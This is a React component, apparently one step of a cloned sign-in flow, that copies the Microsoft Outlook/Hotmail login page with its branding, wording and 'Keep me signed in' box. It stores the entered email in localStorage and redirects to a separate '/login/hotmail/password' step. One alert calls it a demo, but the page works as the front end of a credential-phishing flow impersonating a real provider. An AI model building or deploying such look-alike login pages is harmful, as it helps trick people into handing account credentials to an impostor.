import { useState } from "react";
import emailLogo from "../assets/email-logo.png";

export default function HotmailLogin() {
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [remember, setRemember] = useState(true);

  function nextStep(e) {
    e.preventDefault();

    if (!email.trim()) {
      alert("Please enter your email, phone, or Skype.");
      return;
    }

    localStorage.setItem("hotmail_username", email);
    localStorage.setItem("hotmail_remember", remember ? "true" : "false");

    setLoading(true);

    setTimeout(() => {
      setLoading(false);
      window.location.href = "/login/hotmail/password";
    }, 500);
  }

  return (
    <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-4 py-10">
      <div className="w-full max-w-md rounded-[32px] bg-white border border-slate-200 shadow-[0_30px_70px_rgba(15,23,42,0.12)] overflow-hidden">
        <div className="px-8 py-10 md:px-10 md:py-12">
          <div className="flex justify-center mb-8">
            <img src={emailLogo} alt="Hotmail" className="h-14 w-14 object-contain" />
          </div>

          <div className="text-center">
            <h1 className="text-3xl font-semibold text-slate-900">Outlook</h1>
            <p className="mt-2 text-sm text-slate-500">Sign in to continue</p>
          </div>

          <form onSubmit={nextStep} className="mt-8 space-y-6">
            <div>
              <label className="block text-sm font-medium text-slate-700 mb-2">Email, phone, or Skype</label>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email, phone, or Skype"
                className="w-full rounded-3xl border border-slate-300 bg-slate-50 px-4 py-4 text-slate-900 outline-none transition focus:border-blue-600 focus:bg-white"
              />
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full rounded-3xl bg-blue-600 px-4 py-3 text-base font-semibold text-white shadow-sm transition hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-60"
            >
              {loading ? "Signing in..." : "Sign in"}
            </button>

            <div className="flex items-center gap-3 text-sm text-slate-600">
              <input
                id="remember"
                type="checkbox"
                checked={remember}
                onChange={(e) => setRemember(e.target.checked)}
                className="h-4 w-4 rounded border-slate-300 text-blue-600 focus:ring-blue-500"
              />
              <label htmlFor="remember">Keep me signed in</label>
            </div>

            <div className="text-center text-sm text-slate-600">
              <p>
                No account?{' '}
                <button
                  type="button"
                  className="text-blue-600 hover:underline"
                  onClick={() => window.location.href = "/"}
                >
                  Create one!
                </button>
              </p>
            </div>

            <div className="text-center text-sm text-blue-600 hover:underline">
              <button type="button" onClick={() => alert("Password recovery is not available in this demo.")}>Can't access your account?</button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
